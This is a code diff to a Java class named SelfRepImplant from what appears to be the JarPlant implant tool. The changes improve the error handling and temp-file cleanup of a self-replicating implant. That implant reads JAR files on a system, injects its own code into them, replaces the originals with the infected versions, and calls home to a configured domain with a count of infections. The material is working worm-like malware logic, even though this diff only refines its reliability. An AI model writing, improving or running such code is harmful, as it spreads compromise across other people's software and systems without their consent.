@@ -5,6 +5,7 @@ import io.github.w1th4d.jarplant.*;
 import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.nio.file.FileAlreadyExistsException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardOpenOption;
@@ -125,9 +126,23 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 throw new RuntimeException(e);
             }
 
+            JarFiddler jar;
             try {
-                Path outputTempFile = createTempFileFor(jarToImplant);
-                JarFiddler jar = JarFiddler.buffer(jarToImplant);
+                jar = JarFiddler.buffer(jarToImplant);
+            } catch (IOException e) {
+                System.out.println("[-] Failed to read JAR '" + jarToImplant + "'. Skipping.");
+                continue;
+            }
+
+            Path outputTempFile;
+            try {
+                outputTempFile = createTempFileFor(jarToImplant);
+            } catch (IOException e) {
+                System.out.println("[-] Failed to get a temp file for '" + jarToImplant + "'. Skipping.");
+                continue;
+            }
+
+            try {
                 boolean didInfect = injector.injectInto(jar);
                 if (didInfect) {
                     jar.write(outputTempFile);
@@ -143,6 +158,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             } catch (IOException e) {
                 System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
                 //e.printStackTrace();
+
+                cleanUpTempFile(outputTempFile);
             }
         }
 
@@ -151,6 +168,17 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         if (CONF_DOMAIN != null) {
             callHome(CONF_DOMAIN, "did-" + numInfected, id);
+        }
+    }
+
+    private static void cleanUpTempFile(Path outputTempFile) {
+        if (Files.exists(outputTempFile)) {
+            try {
+                Files.delete(outputTempFile);
+                System.out.println("[#] Removed temp file '" + outputTempFile + "'.");
+            } catch (IOException ex) {
+                System.out.println("[!] Failed to clean up temp file '" + outputTempFile + "'. Sorry for littering!");
+            }
         }
     }
 
@@ -285,22 +313,33 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     }
 
     /**
-     * Create a temporary sibling file for a given existing file.
+     * Get a temporary sibling file for a given existing file.
+     * This will specifically not create the file yet, only assure it does not exist as of right now.
+     * Beware of TOCTOU bugs.
+     * In other words: There are no guarantees that the file will not be crated by something else between the time
+     * of this method returns and when the file is to be actually created.
      *
      * @param baseFile filename to base the temporary file name on
-     * @return new file
+     * @return a path to a temp file that is not yet created
      * @throws IOException if anything went wrong
      */
     private static Path createTempFileFor(Path baseFile) throws IOException {
         String targetFilename = baseFile.getFileName().toString();
 
-        String newFileName = "." + targetFilename + ".tmp";
-        Path tempFilePath = baseFile.resolveSibling(newFileName);
-        if (Files.exists(tempFilePath)) {
-            // Remember that several instances of this thing may run in parallel
-            System.out.println("[-] Temporary file '" + tempFilePath + "' already exist! Aborting.");
-            throw new IOException("File already exist: " + tempFilePath);
-        }
+        Path tempFilePath;
+        int triesLeft = 10;
+        do {
+            int random = rng.nextInt();
+            String newFileName = "." + targetFilename + "." + random + ".tmp";
+            tempFilePath = baseFile.resolveSibling(newFileName);
+
+            triesLeft--;
+            if (triesLeft <= 0) {
+                // What are the odds?
+                throw new IOException("We're all out of luck on generating a temp file.");
+            }
+        } while (Files.exists(tempFilePath));  // It's very unlikely, but keep generating random names...
+
         if (!Files.isWritable(tempFilePath.getParent())) {
             System.out.println("[-] Path '" + tempFilePath.getParent() + "' is not writable! Aborting.");
             throw new IOException("Not writable: " + tempFilePath);
@@ -340,26 +379,24 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         // First move the original JAR (that may be in use at the moment)
         Path moved = original.resolveSibling("." + original.getFileName().getFileName() + ".cache");
-        if (Files.exists(moved)) {
+        try {
+            Files.move(original, moved);
+            System.out.println("[+] Moved '" + original.getFileName() + "' -> '" + moved.getFileName() + "'.");
+        } catch (FileAlreadyExistsException e) {
             /*
-             * It looks like this JAR has already been spiked, but JarPlant did not catch that (or something else is
-             * very off). Just try to back down from this mess.
              * A tempting alternative would be to always create these '.cache' files with a random file name suffix.
              * This will litter the directory and eventually fill up the disk, which is worse.
              * The problem is that there's no _reliable_ way of cleaning up these files when it's unknown if they're
              * in use or not, so they'll be around forever. One way could be to move them into /tmp and hope for
              * the best. Another way is to use a shutdown hook to delete the file, but that will not work if there's
-             * another JVM using the file.
+             * another JVM process using the file.
+             * Just back off.
              */
-            Files.delete(replacement);
-            throw new IOException("File already exist: " + moved);
-        }
-        try {
-            Files.move(original, moved);
-            System.out.println("[+] Moved '" + original.getFileName() + "' -> '" + moved.getFileName() + "'.");
+            cleanUpTempFile(replacement);
+            throw e;
         } catch (IOException e) {
             // Clean up and back off
-            Files.delete(replacement);
+            cleanUpTempFile(replacement);
             throw e;
         }
 
